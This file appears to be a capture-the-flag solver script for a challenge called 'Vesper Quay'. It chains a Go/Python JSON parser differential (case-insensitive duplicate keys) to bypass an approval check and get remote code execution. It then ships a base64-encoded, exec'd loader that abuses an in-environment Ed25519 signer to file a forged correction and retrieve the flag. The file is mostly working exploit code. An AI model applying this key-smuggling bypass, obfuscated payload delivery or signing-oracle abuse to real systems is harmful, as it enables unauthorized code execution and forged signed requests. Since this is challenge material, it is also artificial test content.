"""Vesper Quay solver: Go/Python JSON parser differential -> quay RCE -> Ed25519 correction.

Usage: python -I solve.py http://HOST:PORT

Chain:
1. The desk parses the warrant with Go's encoding/json (keys matched CASE-INSENSITIVELY,
   duplicates last-wins); the quay parses the same bytes with Python's json (keys EXACT,
   case-sensitive). So one body is read two ways:
       plain  "courier"/"argv"  -> quay  reads these (legacy courier + our ["-c",code])
       UPPER  "COURIER"/"ARGV"  -> desk  folds to courier/argv, last-wins (approved + ["status"])
   The desk sees an approved courier with argv ["status"] and accepts; the quay sees the legacy
   courier with argv ["-c", code] and runs `python3 -I -c code`. That is code execution on the quay.
2. The quay child env holds STATION_SIGN (Ed25519 signer using the quay's station key), EDGE_URL,
   and SUBMISSION_ID/QUAY_ID/WARRANT_ID/COURIER_ID. We cannot sign a correction off-box (no key),
   but the loader can invoke STATION_SIGN, which is exactly "a release the quay actually runs".
3. Correction = Ed25519 over the RFC 8785 (JCS) bytes of {applied_primary:false, courier_id(legacy),
   quay_id, submission_id, warrant_id}. The edge request body is those five fields plus "signature"
   (standard Base64). The signer field is "signature", not "station_signature", and the edge rejects
   unknown members, so the body must be exactly these six keys.
"""
import base64
import json
import sys
import urllib.request

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else ''

# Runs ON the quay: sign the canonical bytes and file the correction to the edge.
LOADER = r'''
import os, json, base64, subprocess, urllib.request, urllib.error
e = os.environ
f = {"applied_primary": False, "courier_id": e["COURIER_ID"], "quay_id": e["QUAY_ID"],
     "submission_id": e["SUBMISSION_ID"], "warrant_id": e["WARRANT_ID"]}
canon = jcs(f)
sig = subprocess.run([e["STATION_SIGN"]], input=canon, stdout=subprocess.PIPE).stdout
body = dict(f); body["signature"] = base64.b64encode(sig).decode()
req = urllib.request.Request(e["EDGE_URL"].rstrip("/") + "/v1/corrections",
                             json.dumps(body).encode(), {"Content-Type": "application/json"})
try:
    print(urllib.request.urlopen(req, timeout=10).read().decode())
except urllib.error.HTTPError as ex:
    print(ex.read().decode())
'''


def jcs(fields):
    """RFC 8785 canonical JSON for an object of ASCII strings and booleans."""
    parts = []
    for k in sorted(fields):
        v = fields[k]
        enc = ("true" if v else "false") if isinstance(v, bool) else '"%s"' % v
        parts.append('"%s":%s' % (k, enc))
    return ("{" + ",".join(parts) + "}").encode()


def jget(path):
    with urllib.request.urlopen(BASE + path, timeout=15) as r:
        return json.load(r)


def exploit():
    w = jget('/v1/warrants/current')
    approved, legacy = w['approved_courier'], w['legacy_courier']
    # ship jcs() to the quay too, then the loader body
    loader_src = (
        'def jcs(f):\n'
        ' return ("{"+",".join('
        '\'"%s":%s\'%(k,("true" if f[k] else "false") if isinstance(f[k],bool) else \'"%s"\'%f[k]) '
        'for k in sorted(f))+"}").encode()\n' + LOADER
    )
    b64 = base64.b64encode(loader_src.encode()).decode()
    inner = 'import base64;exec(base64.b64decode(%r))' % b64
    # plain keys first (quay/Python, exact), UPPER keys last (desk/Go, case-insensitive last-wins)
    body = '{"courier":%s,"argv":["-c",%s],"COURIER":%s,"ARGV":["status"]}' % (
        json.dumps(legacy), json.dumps(inner), json.dumps(approved))
    req = urllib.request.Request(BASE + '/v1/warrants', body.encode(), {"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=25) as r:
        resp = json.load(r)
    out = resp['quay']['loader_stdout'].strip()
    print('loader_stdout:', out)
    return json.loads(out).get('clearance_code')


def demo():
    # Matches the server's own test vector in world.py: bool before string, keys sorted.
    assert jcs({"courier_id": "c-1", "applied_primary": False}) == b'{"applied_primary":false,"courier_id":"c-1"}'


if __name__ == '__main__':
    demo()
    if not BASE:
        sys.exit('usage: python -I solve.py http://HOST:PORT')
    print('FLAG:', exploit())
